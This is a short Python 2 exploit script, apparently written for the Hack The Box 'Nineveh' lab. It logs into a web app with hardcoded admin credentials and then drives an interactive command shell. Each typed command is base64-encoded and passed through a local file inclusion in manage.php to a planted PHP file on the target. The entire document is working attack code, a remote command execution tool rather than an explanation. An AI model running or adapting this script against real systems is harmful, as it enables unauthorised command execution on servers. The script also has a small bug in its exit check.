#!/usr/bin/python
import sys
import base64
import requests

s = requests.Session()
payload = {
        'username': 'admin',
        'password': '1q2w3e4r5t',
        'rememberme': 'on'
}
resp = s.post('http://nineveh.htb/department/login.php', data=payload)
# username=^USER^&password=^PASS^&rememberme=on
if resp.status_code != 200:
    print 'Can\'t log in the application!'
    sys.exit(1)

print 'SUccessfully logged in!'
print '\tPHPSESSID={}\n'.format(s.cookies['PHPSESSID'])

'''
We have to create a database called ninevehNotes.php in the other app
'''
while True:
    cmd = raw_input('command> ')
    if cmd.lower == 'exit':
        sys.exit(1)

    cmd = base64.b64encode(cmd)
    resp = s.get('http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=' + cmd)
    print resp.content
